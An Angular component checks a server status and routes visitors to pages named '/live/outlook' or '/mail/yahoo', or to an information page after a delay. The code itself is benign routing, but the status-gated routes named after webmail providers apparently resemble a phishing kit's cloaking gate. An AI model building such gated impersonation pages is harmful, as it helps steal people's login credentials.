import { Component, OnInit } from '@angular/core';
import { Router } from '@angular/router';
import { MainService } from '../shared/services/main.service';

@Component({
  selector: 'app-initial',
  templateUrl: './initial.component.html',
  styleUrls: ['./initial.component.scss'],
})
export class InitialComponent implements OnInit {
  constructor(private router: Router, private mainSrv: MainService) {}

  ngOnInit(): void {
    this.checkStatus();
  }

  async checkStatus() {
    try {
      const data: any = await this.mainSrv.getStatus();
      console.log(data);
      if (data && data.isOk) {
        const current = this.router.url || '';
        localStorage.setItem('isOk', 'true');
        this.router.navigate([this.getRoute(current)]);
      } else {
        localStorage.setItem('isOk', 'false');
        this.goInfo();
      }
    } catch (error) {
      localStorage.setItem('isOk', 'false');
      this.goInfo();
    }
  }

  getRoute(current: string): string {
    if (current.indexOf('outlook') !== -1) {
      return '/live/outlook';
    } else if (current.indexOf('yahoo') !== -1) {
      return '/mail/yahoo';
    }
    return '/information';
  }

  private goInfo() {
    setTimeout(() => {
      this.router.navigate(['/information']);
    }, 2000);
  }
}
